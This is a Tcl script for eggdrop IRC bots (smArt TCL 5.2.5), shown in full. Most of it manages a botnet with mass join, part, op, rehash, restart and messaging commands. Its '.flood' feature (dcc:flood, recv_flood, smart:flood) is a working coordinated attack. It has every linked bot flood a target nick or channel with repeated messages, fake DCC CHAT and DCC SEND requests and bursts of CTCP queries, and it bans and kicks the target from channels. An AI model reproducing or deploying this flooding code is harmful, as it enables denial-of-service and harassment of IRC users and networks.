set smart_core {# -=smArt=- TCL v5.2.5 by ^Boja^ : written for eggdrop bots >= 1.6.0 (Optimized for 1.6.17 bots)
# Use '.help smart' to have a list of all commands and '.news' to have a list of new features.
# Last update: 20-07-2005 - http://smarttcl.sourceforge.net

proc b {} { return \002 }
proc r {} { return \026 }
proc col {{n ""}} { return \003$n }
if {[info proc c] != "c"} { proc c {{n ""}} { return } }
proc u {} { return \037 }
proc boja {} { return "[b]( [c l]smArt[c] )[b]" }
proc rv1 {} { return "5.2.5" }
proc rv {} { return "[c l][rv1][c]" }
proc bl {t} { putlog "[boja] - $t" }
proc pb {i t} { if {[valididx $i]} { putdcc $i "[boja] - $t" } }
proc warn {} { return "[c n][b]Warning!!![b][c]" }
proc strl {v} { return [string tolower $v] }
proc stru {v} { return [string toupper $v] }
proc al {w t} { putlog "[boja] \[[c m]$w[c]\] - $t" }
proc pa {i t} {
    global pa ; if {[info exists pa($i)]} { set q "\[[c m]$pa($i)[c]\] -" } else { set q "-" }
		if {[valididx $i]} { putdcc $i "[boja] $q $t" }
}
proc bi {a i} { return [lindex [split $a] $i] }
proc br {a b e} { return [join [lrange [split $a] $b $e]] }
# Test doublequote
proc q_test {t} {
	set q 0; foreach c [split $t ""] { if {$c == "\""} { incr q } }
	if {[expr $q % 2] != 0 || $q > 2 ||
	($q == 2 && ([string index $t 0] != "\"" || [string index $t [expr [string length $t] - 1]] != "\""))} {
		regsub -all \\\" $t "" t; set t "\"$t\""
	}
	return $t
}
# Test parentesi
proc p_test {t} {
    regsub -all \\\\ $t \\\\\\ t
    regsub -all \\\[ $t \\\\\[ t ; regsub -all \\\] $t \\\\\] t
    regsub -all \\\{ $t \\\\\{ t ; regsub -all \\\} $t \\\\\} t
    return [q_test $t]
}
proc unb {t c p} {
    global errorInfo
    if {[info exists errorInfo] && $errorInfo != ""} { set o $errorInfo } ; catch { unbind $t - $c $p } e
    unset e ; if {[info exists o]} { set errorInfo $o } else { set errorInfo "" }
}
proc s_test {t} { regsub -all "\\\\" $t "\\\\\\" t ; return $t }

proc rw {l {n ""}} {
    if {$n != ""} {
	set s "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ|_^"
    } else {
	set s "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789|_^"
    }
    set r "" ; for {set i 0} {$i < $l} {incr i} { append r [string index $s [rand [string length $s]]] }
    return $r
}

if {[info exists botnet-nick] && ${botnet-nick} != ""} { set bnick ${botnet-nick} } else { set bnick $nick }

regsub -all " " [split [info patchlevel] .] "" tcl_pl
if {$tcl_pl < 831} {
    bl "[warn] Obsolete TCL-Language version ([b]$tcl_pl[b]) ! Please, upgrade at least to 8.3.1!"
    proc validsocket s {
	if {[string range $s 0 3] == "sock" && [bi $s 1] == ""} { return 1 }
	return 0
    }
} else {
    proc validsocket s {
	if {[string range $s 0 3] == "sock" && [bi $s 1] == "" && [file channels $s] == $s} { return 1 }
	return 0
    }
}

proc smart_quit {} {
    global sop_jq
    if {[info exists sop_jq] && [llength $sop_jq] > 0} {
	set q "[lindex $sop_jq [rand [llength $sop_jq]]]"
    } else { set q "I Quit" }
    putserv "QUIT :$q"
}

set wdir "smartTCL" ; set wpref "$wdir/smart.$bnick"
proc check:dirs {} {
    global errorInfo wdir
    if {[info exists errorInfo] && $errorInfo != ""} { set o $errorInfo }
    if {![file exists $wdir] || ![file isdirectory $wdir]} { file mkdir $wdir }
    catch { file attributes [pwd] -permissions 00700 } e
    catch { file attributes [pwd]/.. -permissions 00700 } e
    catch { file attributes [pwd]/../.. -permissions 00700 } e
    catch { file attributes $wdir -permissions 00700 } e
    if {[info exists o]} { set errorInfo $o } else { set errorInfo "" }
}
check:dirs

unbind dcc n chanset *dcc:chanset
bind dcc m|m chanset *dcc:chanset

bind bot - pbi bot:pbi
bind bot - pai bot:pbi
proc bot:pbi {b c a} {
    set i [bi $a 0] ; set t [br $a 1 end] ; if {[valididx $i]} { putdcc $i "[boja] \[From $b\] - $t" }
}

proc netflags {{b ""}} {
    if {$b == ""} { global bnick ; set b $bnick }
    set f [split [chattr $b] ""] ; set r "" ; foreach F $f { if {[string is upper $F]} { lappend r $F } } ; return $r
}

proc samenet {b1 {b2 ""}} {
    if {$b2 == ""} { global bnick ; set b2 $bnick } ; set f1 [netflags $b1] ; set f2 [netflags $b2] ; set r 0
    foreach f $f1 { if {[lsearch -exact $f2 $f] != -1} { set r 1 ; break } } ; return $r
}

proc addhost {u h} { setuser $u HOSTS $h }

proc validflag {f} {
    if {$f == "-"} { return 1 }
    if {[lsearch -exact "- +" [string index $f 0]] == -1 } { return 0 }
    if {[string length $f] < 2} { return 0 }
    if {[regexp -nocase -- \[^a-z\] [string range $f 1 end]]} { return 0 }
    return 1
}

proc flagged {h g {l ""} {c ""}} {
	if {$g == "permowner"} {
		global owner ; regsub -all " " $owner "" o
		if {[lsearch -exact [strl [split $o ,]] [strl $h]] != -1} { return 1 } else { return 0 }
	}
	if {[matchattr $h $g]} { return 1 }
	if {$c != ""} { if {[matchattr $h |$l $c]} { return 1 } ; return 0 }
	if {$l != ""} {
		if {[validchan $l]} { if {[matchattr $h |$g $l]} { return 1 } ; return 0 }
		foreach C [channels] { if {[matchattr $h |$l $C]} { return 1 } }
	}
	return 0
}

proc numip {h} {
    set h [split $h .]
    if {[llength $h] != 4} { return 0 }
    foreach n $h {
	if {[string trim $n "0123456789"] != "" || $n < 0 || $n > 255} { return 0 }
    }
    return 1
}

proc strip_id {uh} {
    set x [string index $uh 0]
    if {$x == "~" || $x == "+" || $x == "-" || $x == "^" || $x == "="} {
	set uh [string range $uh 1 end]
    }
    return $uh
}

proc wmh {h {w ""}} {
    set h [strip_id $h] ; set hi [lindex [split $h @] 0] ; set hh [lindex [split $h @] 1] ; set r ""
    if {$w == "ban" && [string length $hi] > 8} { set hi [string range $hi 1 end] }
    if {[numip $hh] && $w != "bot"} {
	set r [maskhost $h]
    } elseif {$w == "bot"} {
	if {$hi == "" || $hh == ""} { set r "none" } else { set r *!$hi@$hh }
    } else {
	set d 0 ; set o 0
	for {set i 0} {$i < [string length $hh]} {incr i} {
	    set c [string index $hh $i]
	    if {$c == "."} { incr d ; if {$o} { set o 0 } }
	    if {$o} { continue }
	    append r $c
	    if {$d == 0 && $c == "-"} { set o 1 ; append r * ; continue }
	}
	set r *!$hi@$r
    }
    if {$w == "ban"} { regsub ! $r !* r }
    return $r
}

foreach d [dcclist TELNET] {
    if {[string match *telnet* [lindex $d 1]]} {
	set all_port [lindex [lindex $d 4] 1]
    } elseif {[string match *users* [lindex $d 1]]} {
	set users_port [lindex [lindex $d 4] 1]
    } elseif {[string match *bots* [lindex $d 1]]} {
	set bots_port [lindex [lindex $d 4] 1]
    }
}

bind chon - * smart_wellcome

proc smart_wellcome {h i} {
    global botnick server nick network
    pb $i "[b]$botnick[b] is running advanced [boja] TCL version [b][rv][b] by [b]^Boja^[b]"
    setchan $i 0
    putdcc $i ""
    smart_who $i
    putdcc $i ""
    pb $i "Use '[b].help smart[b]' to get a list of all commands for [boja] v[rv]"
    pb $i "Or try '[b].news[b]' to see the changelog!"
}

################
# Action Fixes #
################

bind filt - "\001ACTION *\001" filt_act
proc filt_act {i a} { return ".me [string trim [join [lrange [split $a] 1 end]] \001]" }

bind filt - "/me *" filt_telnet_act
proc filt_telnet_act {i a} { return ".me [join [lrange [split $a] 1 end]]" }

##############
# Mass Stuff #
##############

bind dcc - who dcc:who
bind dcc o chbot *dcc:relay
bind dcc o|o wallop wallop
bind dcc o|o notice notice
bind dcc o|o fmsg dcc:fmsg
bind dcc o|o fnotice dcc:fmsg
bind dcc o|o ctcp dcc:ctcp
bind dcc o amsg dcc:amsg
bind dcc o anotice dcc:amsg
bind dcc o check dcc:check
bind dcc m|m dcc dcc:pdcc
bind dcc m orph dcc:orph
bind dcc m massmsg dcc:massmsg
bind dcc m massnotice dcc:massmsg
bind dcc n flood dcc:flood
bind dcc m|m mop dcc:mop
bind dcc m join dcc:join
bind dcc m part dcc:part
bind dcc n mpart dcc:mpart
bind dcc n mjoin dcc:mjoin
bind dcc n bjoin dcc:bjoin
bind dcc n bpart dcc:bpart
bind dcc t mrehash dcc:mrehash
bind dcc t brehash dcc:brehash
bind dcc n mrestart dcc:mrestart
bind dcc t brestart dcc:brestart
bind dcc n su *dcc:su
bind bot - massmsg recv_massmsg
bind bot - flood recv_flood
bind bot - mrestart recv_mrestart
bind bot - mrehash recv_mrehash
bind bot - mjoin recv_mjoin
bind bot - mpart recv_mpart
bind bot - checkreport check_report
bind bot - check recv_check
bind dcc t|m msave dcc:msave
bind bot - msave recv_msave
bind dcc m|m mchanset dcc:mchanset
bind bot - mchanset recv_mchanset

proc dcc:pdcc {h i a} {
    global pa ; set pa($i) notice ; set w [bi $a 0]
    if {$w == ""} { pa $i "Usage: '.dcc <nickname>'" ; return 0 }
    putcmdlog "\#$h\# dcc $w" ; pa $i "I am DCC chatting $w.."
    putnotc $w "You have been invited to my partyline by $h."
    putserv "PRIVMSG $w :\001DCC CHAT chat [myip] [port]\001"
}

proc dcc:orph {h i a} {
    set a [string index $a 0]
    putcmdlog "\#$h\# orph $a"
    if {$a == ""} {
	set a "o"
    }
    set n 0
    foreach u [userlist] {
	set o 0
	if {![matchattr $u $a]} {
	    set o 1
	    foreach c [channels] {
		if {[matchattr $u |$a $c]} {
		    set o 0
		}
	    }
	}
	if {$o} {
	    incr n
	    pb $i "Orphan user : [b]$u[b]"
	}
    }
    if {!$n} {
	set n "none! ^_^"
    }
    pb $i "Total orphan users : [b]$n[b]"
}

proc dcc:fmsg {h i a} {
    global lastbind
    set f [bi $a 0] ; set t [br $a 1 end]
    if {$t == ""} { pb $i "Usage : .$lastbind <+/- flags \[\#channel\]> <text>" ; return 0 }
    if {[string index $t 0] == "\#"} { set c [bi $t 0] ; set t [lrange $t 1 end] } else { set c "" }
    putcmdlog "\#$h\# $lastbind $f $c \[...\]"
    if {[string match *not* $lastbind]} { set w "NOTICE" } else { set w "PRIVMSG" }
    set n 0
    foreach u [userlist] {
	set ok 0
	if {![matchattr $u b]} {
	    if {$c != ""} {
		if {[matchattr $u |$f $c]} { set ok 1 }
	    } else {
		if {[matchattr $u $f]} { set ok 1 }
	    }
	    if {$ok} { if {[hand2nick $u] != ""} { incr n ; putquick "$w [hand2nick $u] :$t" } }
	}
    }
    pb $i "Sent text to $n users!"
}

proc dcc:amsg {h i a} {
    global lastbind
    if {$a == ""} { pb $i "Usage : .$lastbind <text>" ; return 0 }
    putcmdlog "\#$h\# $lastbind \[...\]"
    if {[string match *not* $lastbind]} { set w "NOTICE" } else { set w "PRIVMSG" }
    foreach c [channels] { putquick "$w $c :$a" }
}
proc dcc:mop {h i a} {
    global modes-per-line
    set c [bi $a 0] ; set m [lrange $a 1 end]
    if {$c == ""} { pb $i "Usage : .mop <\#channel> \[hostmask1\] \[hostmask2\] .." ; return 0 }
    if {![validchan $c]} { pb $i "Sorry, I don't monitor $c!" ; return 0 }
    if {![botisop $c]} { pb $i "I need ops on $c, trying anyway.." }
    putcmdlog "\#$h\# mop $c $m"
    if {$m == ""} { set q "all ops on $c" } else { set q "users matching hostmask on $c: $m" }
    pb $i "Oping $q" ; set l "" ; set t 0
    foreach n [chanlist $c] {
	if {[flagged [nick2hand $n $c] o $c] && ![isop $n $c]} {
	    if {$m != ""} {
		foreach M $m { if {[string match $M "$n![getchanhost $n $c]"]} { lappend l $n ; break } }
	    } else { lappend l $n }
	}
	if {[llength $l] >= ${modes-per-line}} {
	    incr t [llength $l] ; putquick "MODE $c +oooooo $l" ; set l ""
	}
    }
    if {$l != ""} { incr t [llength $l] ; putquick "MODE $c +oooooo $l" }
    if {$t == 0} { pb $i "No users to op on $c" } else { pb $i "Oped $t users on $c" }
}

proc dcc:join {h i a} {
    set c [bi $a 0]
    set k [bi $a 1]
    if {$c == ""} {
	pb $i "Usage: .join <#channel> \[key\]"
	return 0
    }
    putcmdlog "#$h# join $c \[...\]"
    channel add $c
    sop:chan $c
    if {$k != ""} {
	putquick "JOIN $c $k"
    }
    utimer 1 "sop:need $c op"
    utimer [expr 3 + [rand 4]] "sop:need $c op"
    bl "Joined channel $c : requested by $h."
}

proc dcc:part {h idx arg} {
    set chan [bi $arg 0]
    set reason [lrange $arg 1 end]
    if {$chan == ""} {
	pb $idx "Usage: .part <#channel> \[part-message\]"
	return 0
    }
    if {![validchan $chan]} {
	pb $idx "I don't monitor $chan! :("
	return 0
    }
    putcmdlog "#$h# part $chan $reason"
    if {$reason == ""} { set reason "[boja]" }
    putserv "PART $chan :$reason"
    channel remove $chan
    bl "Parted channel $chan : requested by $h."    
}

proc dcc:who {h i a} {
    putcmdlog "\#$h\# who"
    smart_who $i
}

proc smart_who {i} {
    if {[bots] != ""} {
	putdcc $i "[b]*[b]-----=> Connected bots <=-----[b]*[b]"
        putdcc $i "[up_bots]"
	putdcc $i "Total linked bots : [b][expr [llength [bots]] + 1][b]"
	putdcc $i "[b]*[b]------------------------------[b]*[b]"
    }
    putdcc $i "[b]*[b]--=> People in party-line <=--[b]*[b]"
    putdcc $i "[b]*[b]------------------------------[b]*[b]"
    foreach w [whom 0] {
	set nick [lindex $w 0]
	set rbot [lindex $w 1]
	set host [lindex $w 2]
	set mask [lindex $w 3]
	set idle [lindex $w 4]
	putdcc $i "\[[expand_who $mask]\]-=( $nick@$rbot\t)=->idle $idle\m"
    }
    putdcc $i "[b]*[b]------------------------------[b]*[b]"
}

proc up_bots {} {
    set botz ""
    foreach b [bots] {
	lappend botz $b
    }
    return $botz
}

proc expand_who {mask} {
    if {$mask == "*"} { return "Owner " }
    if {$mask == "+"} { return "Master" }
    if {$mask == "@"} { return " Oper " }
    if {$mask == "%"} { return "Botnet" }
    return "Friend"
}

proc dcc:massmsg {h i a} {
    global lastbind botnick
    set t [bi $a 0]
    set m [lrange $a 1 end]
    if {$m == ""} {
	pb $i "Usage: .$lastbind <nick/\#channel> <text>"
	return 0
    }
    if {[string match *not* $lastbind]} {
	set w "NOTICE"
    } else {
	set w "PRIVMSG"
    }
    putcmdlog "\#$h\# $lastbind $t $m"
    putallbots "massmsg $h $w $t $m"
    putserv "$w $t :$m"
    putserv "$w $t :[b]$m[b]"
    putserv "$w $t :[r]$m[r]"
    putserv "$w $t :[c [rand 16]]$m[c]"
    putserv "$w $t :[u]$m[u]"
}

proc recv_massmsg {b c a} {
    set h [bi $a 0]
    set w [bi $a 1]
    set t [bi $a 2]
    set m [lrange $a 3 end]
    if {$w == "NOTICE"} {
	set l "noticing"
    } else {
	set l "messaging"
    }
    bl "mass-$l $t : requested by $h ( from $b )"
    putserv "$w $t :$m"
    putserv "$w $t :[b]$m[b]"
    putserv "$w $t :[r]$m[r]"
    putserv "$w $t :[c [rand 16]]$m[c]"
    putserv "$w $t :[u]$m[u]"
}

proc dcc:flood {h i a} {
    global nick_module_loaded nick_cycle nick_cycle_ori nick_time nick_time_ori nick_gap nick_gap_ori
    set g [stru [bi $a 0]] ; set w [bi $a 1] ; set m [br $a 2 end] ; set t [bi $m 0] ; set f ""
    if {$g == "STOP"} {
	putcmdlog "\#$h\# flood stop" ; smart:kill_flood ; putallbots "flood $h STOP STOP" ; return 0
    }
    regsub -all "," $g " " g
    if {[string length [bi $g 0]] != 1 || $w == ""} {
	pb $i "Usage: .flood A <nick / \#chan> \[time\] \[msg\]"
	pb $i "Or   : .flood X/Y/Z/... <target> \[time\] \[msg\]"
	pb $i "Or   : .flood X,Y,Z,... <target> \[time\] \[msg\]" ; return 0
    }
    if {$nick_module_loaded != 1} {
	global nick_module_want
	set nick_module_want 1 ; bl "Loading [b]Nick[b] module : required by '.flood' invoked by $h."
	setup:save nick
    }
    foreach y [utimers] {
	if {[string match "*smart:flood*" [lindex $y 1]]} { set f [bi [lindex $y 1] 1] ; break }
    }
    if {$f != ""} { pb $i "I 'm already flooding [b]$f[b], try '.flood stop' first! ;)" ; return 0 }
    putcmdlog "\#$h\# flood $a"
    if {$t == "" || [string trim $t "0123456789"] != ""} { set t 90 } else { set m [br $m 1 end] }
    if {$m == ""} { set m "[rw 100]" }
    if {$g == "A"} {
	putallbots "flood $h $w $t $m"
	set g1 "ALL connected"
    } else {
	foreach b [bots] {
	    foreach j $g {
		if {[matchattr $b $j]} {
		    putbot $b "flood $h $w $t $m"
		}
	    }
	}
	regsub -all " " $g "," g1
    }
    bl "Flooding $w for $t seconds with $g1 bots : requested by $h."
    if {![validchan $w]} {
	foreach c [channels] {
	    foreach n [chanlist $c] {
		if {[strl $n] == [strl $w]} {
		    if {[botisop $c]} {
			putquick "MODE $c +b $w!*@*" ; putkick $c $n "[boja]" ; flushmode $c
		    }
		}
	    }
	}
    }
    set T 12
    if {![info exists nick_cycle_ori]} { set nick_cycle_ori $nick_cycle }
    if {![info exists nick_time_ori]} { set nick_time_ori $nick_time }
    if {![info exists nick_gap_ori]} { set nick_gap_ori $nick_gap }
    if {$nick_cycle == "off"} { set nick_cycle "random" }
    set nick_time $T ; set nick_gap 0 ; nick:check
    utimer 3 "smart:flood $w $T $m" ; utimer [expr 3 + $t] "smart:kill_flood $w"
}

proc recv_flood {b cm a} {
    global nick_module_loaded nick_cycle nick_cycle_ori nick_time nick_time_ori nick_gap nick_gap_ori
    set h [bi $a 0] ; set t [bi $a 1] ; set time [bi $a 2] ; set m [lrange $a 3 end] ; set f ""
    if {$t == "STOP" && $time == "STOP"} {
	bl "Stopping flood : requested by $h ( from $b )" ; smart:kill_flood ; return 0
    }
    foreach y [utimers] {
	if {[string match "*smart:flood*" [lindex $y 1]]} { set f [bi [lindex $y 1] 1] ; break }
    }
    if {$f != ""} {
	bl "Rejected flood-request for $t invoked by $h (from $b): already flooding [b]$f[b]" ; return 0
    }
    bl "Flooding $t for $time seconds : requested by $h (from $b)"
    if {![validchan $t]} {
	foreach c [channels] {
	    foreach n [chanlist $c] {
		if {[strl $n] == [strl $t]} {
		    if {[botisop $c]} {
			putquick "MODE $c +b $t!*@*" ; putkick $c $n "[boja]" ; flushmode $c
		    }
		}
	    }
	}
    }
    if {$nick_module_loaded != 1} {
	global nick_module_want
	set nick_module_want 1 ; bl "Loading [b]Nick[b] module : required by '.flood' invoked by $h (from $b)."
	setup:save nick
    }
    set rtime 10
    if {![info exists nick_cycle_ori]} { set nick_cycle_ori $nick_cycle }
    if {![info exists nick_time_ori]} { set nick_time_ori $nick_time }
    if {![info exists nick_gap_ori]} { set nick_gap_ori $nick_gap }
    if {$nick_cycle == "off"} { set nick_cycle "random" }
    set nick_time $rtime ; set nick_gap 0 ; nick:check ; smart:flood $t $rtime $m
    utimer $time "smart:kill_flood $t"
}

proc smart:flood {t rtime m} {
    global nick botnick
    putquick "PRIVMSG $t :$m"
    putquick "PRIVMSG $t :\001DCC CHAT chat [rand 1000000000] [rand 65536]\001"
    putquick "PRIVMSG $t :[b]$m[b]"
    putquick "PRIVMSG $t :[r]$m[r]"
    putquick "PRIVMSG $t :\001DCC SEND [rw 12] [rand 10000000000] [rand 65536] [rand 100000000]\001"
    putquick "PRIVMSG $t :[c [rand 16]]$m[c]"
    putquick "PRIVMSG $t :[u]$m[u]"
    utimer 1 "putquick \"PRIVMSG $t :\001PING\001\""
    utimer 2 "putquick \"PRIVMSG $t :\001VERSION\001\""
    utimer 3 "putquick \"PRIVMSG $t :\001TIME\001\""
    utimer 4 "putquick \"PRIVMSG $t :\001FINGER\001\""
    utimer 5 "putquick \"PRIVMSG $t :\001USERINFO\001\""
    utimer 6 "putquick \"PRIVMSG $t :\001SOURCE\001\""
    utimer 7 "putquick \"PRIVMSG $t :\001CLIENTINFO\001\""
    utimer [expr $rtime / 2] "smart:flood $t $rtime {$m}"
}

proc smart:kill_flood {{w ""}} {
    global nick_module_loaded nick_cycle nick_cycle_ori nick_time nick_time_ori nick_gap nick_gap_ori
    foreach t [utimers] {
	if {[string match "*smart:flood*" [lindex $t 1]]} {
	    set w [bi [lindex $t 1] 1] ; killutimer [lindex $t 2]
	}
	if {[string match "*smart:kill_flood*" [lindex $t 1]]} { killutimer [lindex $t 2] }
    }
    if {![validchan $w]} {
	foreach c [channels] { if {[ischanban "$w!*@*" $c]} { putquick "MODE $c -b $w!*@*" ; flushmode $c }}
    }
    if {[info exists nick_cycle_ori]} { set nick_cycle $nick_cycle_ori ; unset nick_cycle_ori }
    if {[info exists nick_time_ori]} { set nick_time $nick_time_ori ; unset nick_time_ori }
    if {[info exists nick_gap_ori]} { set nick_gap $nick_gap_ori ; unset nick_gap_ori }
    nick:check ; bl "Finished flooding $w."
}

proc dcc:ctcp {h i a} {
    set t [bi $a 0] ; set w [br $a 1 end]
    if {$t == ""} { pb $i "Usage: ctcp <nick> \[type\]" ; return 0 }
    putcmdlog "\#$h\# ctcp $t $w" ; putquick "PRIVMSG $t :\001$w\001" ; pb $i "Sent CTCP $w to $t"
}

proc dcc:check {h i a} {
    global bnick
    putcmdlog "#$h# check" ; putallbots "check $i $h" ; set no ""
    foreach c [channels] { if {![botisop $c]} { lappend no $c } }
    if {$no == ""} { pb $i "[b]$bnick[b] - \tOped on all channels! ^_^" ; return 0 }
    pb $i "[b]$bnick[b] - \tI need ops on: [b]$no[b]"
}

proc recv_check {b cm a} {
    set i [bi $a 0] ; set h [bi $a 1] ; set no  ""
    foreach c [channels] { if {![botisop $c]} { lappend no $c } }
    if {$no == ""} { putbot $b "checkreport $i none" ; return 0 }
    putbot $b "checkreport $i $no"
}

proc check_report {b cm a} {
    set i [bi $a 0] ; set no [lrange $a 1 end]
    if {$no == "none"} { pb $i "[b]$b[b] - \tOped on all channels! ^_^" ; return 0 }
    pb $i "[b]$b[b] - \tI need ops on: [b]$no[b]"
}

proc wallop {h idx arg} {
    set chan [bi $arg 0]
    set msg [lrange $arg 1 end]
    if {$msg == ""} {
	pb $idx "Usage: .wallop <\#chan> <msg>"
	return 0
    }
    if {![validchan $chan]} {
	pb $idx "I don't monitor $chan! :("
	return 0
    }
    if {![matchattr $h o|o $chan]} {
	pb $idx "Sorry, you are not +o on $chan !"
	return 0
    }
    putcmdlog "\#$h\# wallop [lrange $arg 0 end]"
    foreach nick [chanlist $chan] {
	if {[isop $nick $chan]} {
	    putserv "NOTICE $nick :([b]WallOps[b])-> $msg"
	}
    }
    pb $idx "Sent wallop to $chan."
}

proc notice {h i a} {
    set t [bi $a 0] ; set m [br $a 1 end]
    if {$m == ""} { pb $i "Usage: .notice <nick/#channel> <message>" ; return 0 }
    putcmdlog "\#$h\# notice $t $m" ; putquick "NOTICE $t :$m"
}

proc dcc:brestart {h i a} {
    set w [bi $a 0]
    if {$w == ""} {
	pb $i "Usage : .brestart <botname>"
	return 0
    }
    if {![matchattr $w b]} {
	pb $i "Sorry, I can't recognize '[b]$w[b]' as a valid bot.."
	return 0
    }
    if {![islinked $w]} {
	pb $i "Sorry, bot '[b]$w[b]' is not linked ! Link it first.. ;)"
	return 0
    }
    putcmdlog "\#$h\# brestart $w"
    putbot $w "mrestart $h"
    bl "Restarting remote bot $w : requested by $h."
}

proc dcc:mrestart {h i a} {
    global bnick
    set g [stru [bi $a 0]]
    if {[string length $g] != 1} {
	pb $i "Usage : '.mrestart A' or '.mrestart X/Y/Z/...'"
	return 0
    }
    putcmdlog "\#$h\# mrestart $g"
    if {$g == "A"} {
	dccputchan 0 "[boja] - $h is mass-restarting ALL connected bots."
	putallbots "mrestart $h"
    } else {
	dccputchan 0 "[boja] - $h is mass-restarting $g bots."
	set bs ""
	foreach b [bots] {
	    if {[matchattr $b $g]} {
		putbot $b "mrestart $h"
		lappend bs $b
	    }
	}
	pb $i "Sent restart-request to $bs."
    }
    if {$g == "A" || [matchattr $bnick $g]} { restart }
}

proc recv_mrestart {b c a} {
    set h [bi $a 0]
    bl "Restarting the bot : requested by $h ( from $b )"
    restart
}

proc dcc:brehash {h idx arg} {
    set who [bi $arg 0]
    if {$who == ""} {
	pb $idx "Usage : .brehash <botname>"
	return 0
    }
    if {![matchattr $who b]} {
	pb $idx "Sorry, I can't recognize '$who' as a valid bot.."
	return 0
    }
    if {![islinked $who]} {
	pb $idx "Sorry, bot '$who' is not linked ! Link it first.. ;)"
	return 0
    }
    putcmdlog "\#$h\# brehash $who"
    putbot $who "mrehash $h"
    bl "Rehashing remote bot $who : requested by $h."
}

proc dcc:mrehash {h idx arg} {
    global bnick
    set g [stru [bi $arg 0]]
    if {[string length $g] != 1} {
	pb $idx "Usage : .mrehash A"
	pb $idx "or .mrehash X/Y/Z..."
	return 0
    }
    putcmdlog "\#$h\# mrehash $g"
    if {$g == "A"} {
	dccputchan 0 "[boja] - $h is mass-rehashing ALL connected bots."
	putallbots "mrehash $h"
    } else {
	dccputchan 0 "[boja] - $h is mass-rehashing $g bots."
	set botsent ""
	foreach bot [bots] {
	    if {[matchattr $bot $g]} {
		putbot $bot "mrehash $h"
		lappend botsent $bot
	    }
	}
	pb $idx "Sent rehash-request to $botsent."
    }
    if {$g == "A" || [matchattr $bnick $g]} { rehash }
}

proc recv_mrehash {b c a} { set h [bi $a 0] ; bl "Rehashing the bot : requested by $h ( from $b )" ; rehash }

proc dcc:mjoin {h i a} {
    global bnick botnick
    set c [bi $a 0] ; set g [stru [bi $a 1]] ; set k [bi $a 2]
    if {[string length $g] != 1} {
	pb $i "Usage: .mjoin <\#channel> A \[key\]" ; pb $i "Or   : .mjoin <\#channel> X/Y/Z/...\[key\]"
	pb $i "See '.help mjoin' to know more ... ;)" ; return 0
    }
    putcmdlog "\#$h\# mjoin $c $g $k" ; set bs ""
    if {$g == "A" || [matchattr $bnick $g]} {
	if {![validchan $c]} {
	    channel add $c ; sop:chan $c
	} else {
	    pb $i "I'm already monitoring $c.. Sending join-request to other bots! ;)"
	}
	if {$k != ""} { putserv "JOIN $c $k" }
	utimer [rand [expr [llength [bots]] + 1]] "sop:need $c op"
    }
    if {$g == "A"} {
	set g "ALL connected" ; putallbots "mjoin $c $h $k"
    } else {
	foreach b [bots] { if {[matchattr $b $g]} { putbot $b "mjoin $c $h $k" ; lappend bs $b } }
	pb $i "Sent join request for $c to $bs."
    }
    bl "Joining $c with $g bots : requested by $h."
}

proc dcc:bjoin {h i a} {
    set b [bi $a 0] ; set c [bi $a 1] ; set k [bi $a 2]
    if {$c == "" || [string index $c 0] != "\#"} {
	pb $i "Usage : .bjoin <botname> <\#channel> \[key\]" ; return 0
    }
    if {![matchattr $b b]} {
	pb $i "Sorry, I can't recognize $b as a valid bot.. :(" ; return 0
    } elseif {![islinked $b]} {
	pb $i "Sorry, bot $b is down! :( Try '.botstat', '.tolink' or '.bottree'.." ; return 0
    }
    putcmdlog "\#$h\# bjoin $b $c $k" ; putbot $b "mjoin $c $h $k"
    bl "Sent join-order for $c to $b ( requested by $h )"
}

proc recv_mjoin {b cm a} {
    set c [bi $a 0] ; set h [bi $a 1] ; set k [bi $a 2]
    if {[validchan $c]} { if {$k != ""} { putserv "JOIN $c $k" } ; return 0 }
    channel add $c ; sop:chan $c
    if {$k != ""} { putserv "JOIN $c $k" }
    utimer [rand [expr [llength [bots]] + 1]] "sop:need $c op"
    bl "Joined channel $c : requested by $h ( from $b )"
}

proc dcc:mpart {h i a} {
    global bnick botnick
    set pchan [bi $a 0]
    set g [stru [bi $a 1]]
    set reason [br $a 2 end]
    if {[string length $g] != 1} {
	pb $i "Usage: .mpart <\#channel> A \[part-message\]"
	pb $i "Or   : .mpart <\#channel> X/Y/Z/... \[part-message\]"
	pb $i "See '.help mpart' to know more ... ;)"
	return 0
    }
    putcmdlog "\#$h\# mpart $pchan $g $reason"
    if {$reason == ""} { set reason [boja] }
    if {$g == "A" || [matchattr $bnick $g]} {
	if {[validchan $pchan]} {
	    putserv "PART $pchan :$reason"
	    channel remove $pchan
	} else {
	    pb $i "I don't monitor $pchan.. Sending part-request to other bots! ;)"
	}
    }
    set botsent ""
    if {$g == "A"} {
	set g "ALL connected"
	putallbots "mpart $pchan $h $reason"
    } else {
	foreach bot [bots] {
	    if {[matchattr $bot $g]} {
		putbot $bot "mpart $pchan $h $reason"
		lappend botsent $bot
	    }
	}
	pb $i "Sent part request for $pchan to $botsent."
    }
    bl "Parting $g bots from $pchan : requested by $h"
}

proc dcc:bpart {h i a} {
    set b [bi $a 0]
    set c [bi $a 1]
    if {$c == "" || [string index $c 0] != "\#"} {
	pb $i "Usage : .bpart <botname> <\#channel> \[part-message\]"
	return 0
    }
    set r [br $a 2 end]
    if {![matchattr $b b]} {
	pb $i "Sorry, I can't recognize $b as a valid bot.. :("
	return 0
    } elseif {![islinked $b]} {
	pb $i "Sorry, bot $b is down! :( Try '.botstat' or '.tolink'.."
	return 0
    }
    putcmdlog "\#$h\# bpart $b $c $r"
    if {$r == ""} { set r "[boja]" }
    putbot $b "mpart $c $h $r"
    bl "Sent part request for $c to $b : requested by $h."
}

proc recv_mpart {bot command arg} {
    set chan [bi $arg 0]
    set h [bi $arg 1]
    set reason [lrange $arg 2 end]
    if {![validchan $chan]} { return 0 }
    putserv "PART $chan :$reason"
    channel remove $chan
    bl "Parted channel $chan : requested by $h ( from $bot )"
}

proc dcc:msave {h i a} {
    putcmdlog "#$h# msave"
    bl "Doing a BotNet Save : requested by $h."
    putallbots "msave $h"
    save
}

proc recv_msave {b c a} {
    set h [bi $a 0]
    bl "Doing a BotNet Save : requested by $h ( from $b )"
    save
}

proc bcset {c m} {
    global errorInfo
    if {[bi $m 0] == "chanmode"} { set m "chanmode {[br $m 1 end]}" } ; set k "channel set $c $m"
    if {[info exists errorInfo] && $errorInfo != ""} { set o $errorInfo }
    catch { eval $k } e
    if {$e != ""} {
	if {[info exists o]} { set errorInfo $o } else { set errorInfo "" }
	return $e
    }
    return 1
}

